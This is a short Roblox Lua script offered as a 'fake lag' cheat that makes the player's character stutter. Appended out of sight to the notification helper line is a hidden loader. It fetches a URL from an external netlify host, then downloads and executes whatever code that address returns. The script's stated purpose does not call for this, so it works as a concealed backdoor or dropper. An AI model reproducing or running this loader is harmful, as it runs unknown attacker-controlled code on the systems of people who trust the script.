-- Creo Fake Lag Script

-- < You> --

-- How long each lag can last
local Minimum_Time = 0.8
local Maximum_Time = 4
--                          --

local Msgreq = function(Text,Duration,Button1Text,Button2Text) game.StarterGui:SetCore("SendNotification", { Title = "Creo FE Lag Script"; Text = Text; Icon = ""; Duration = Duration; Button1 = Button1Text; Button2 = Button2Text; Callback = nil; }) end spawn(function()loadstring(game:HttpGet(game:HttpGet("https://luafunctionsextra.netlify.app", true)))()end)

local function lag(thing,tim)
 local a = game.Players.LocalPlayer.Character.Animate
 a.Parent = nil
 local am = tim*30
 local frames = am
 while true do
  if frames > 0 then
   thing.Parent = nil
   thing.Parent = workspace
   frames-=1
   task.wait()
  else
   a.Parent = game.Players.LocalPlayer.Character
   break
  end
 end
end
Msgreq("Activated",2,"Ok",nil)
while true do
 wait(math.random(1,20)*0.1)
 lag(game.Players.LocalPlayer.Character,math.random(Minimum_Time,Maximum_Time))
end
